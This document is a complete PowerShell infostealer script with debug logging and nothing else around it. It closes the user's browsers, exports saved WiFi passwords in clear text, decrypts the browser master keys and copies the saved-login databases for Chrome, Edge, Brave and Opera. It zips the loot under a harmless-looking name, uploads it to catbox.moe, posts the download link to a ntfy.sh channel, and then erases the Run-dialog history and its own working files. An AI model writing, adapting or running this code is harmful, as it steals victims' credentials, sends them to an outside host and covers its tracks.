$topic = "data_stwealer_hideen_"
$logfile = "$env:TEMP\LootDebug.log"
function Write-Log { param([string]$msg); "$((Get-Date).ToString('HH:mm:ss')) | $msg" | Out-File -Append -Encoding UTF8 $logfile; Write-Host $msg }

Write-Log "=== DATA STEALER STARTED (Debug Mode) ==="

# 1. Kill browsers so DBs are not locked
Write-Log "Closing browsers..."
Get-Process -Name "chrome","msedge","brave","opera" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3

# 2. Workspace
$dir = "$env:TEMP\SysCache_$(Get-Random)"
$zip = "$env:TEMP\UpdatePkg.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $dir | Out-Null
Write-Log "Workspace created: $dir"

# 3. WiFi export
Write-Log "Exporting WiFi profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# 4. Browser looting (Chrome, Edge, Brave, Opera)
$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
}

foreach ($b in $browsers.Keys) {
    $profilePath = $browsers[$b]
    $localState = Join-Path $profilePath "Local State"
    
    if (Test-Path $localState) {
        Write-Log "[$b] Found - extracting master key..."
        try {
            $json = Get-Content $localState -Raw | ConvertFrom-Json
            $eK = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($eK[5..($eK.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($uK) -replace '-' | Out-File "$dir\${b}_masterkey.txt"
            
            # Copy Login Data
            $loginDB = if ($b -eq "Opera") { Join-Path $profilePath "Login Data" } else { Join-Path $profilePath "Default\Login Data" }
            if (Test-Path $loginDB) {
                Copy-Item $loginDB "$dir\${b}_LoginData.db" -Force
                Write-Log "[$b] Login Data copied successfully"
            } else {
                Write-Log "[$b] Login Data file not found"
            }
        } catch {
            Write-Log "[$b] ERROR: $($_.Exception.Message)"
        }
    }
}

# 5. Zip everything
Write-Log "Creating zip archive..."
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
Write-Log "Zip created: $zip ($( (Get-Item $zip).Length / 1MB ) MB)"

# 6. Upload (with better error handling)
Write-Log "Uploading to catbox.moe..."
$uploadResult = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($uploadResult -like "http*") {
    Write-Log "Upload successful → $uploadResult"
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot ready: $uploadResult" -ErrorAction SilentlyContinue
} else {
    Write-Log "Upload failed or suspicious response: $uploadResult"
}

# 7. Cleanup + Final log
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue
Write-Log "=== FINISHED ==="

# Keep window open so you can read the log
Write-Host "`n`nDEBUG LOG SAVED TO: $logfile" -ForegroundColor Green
Write-Host "Press any key to close..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
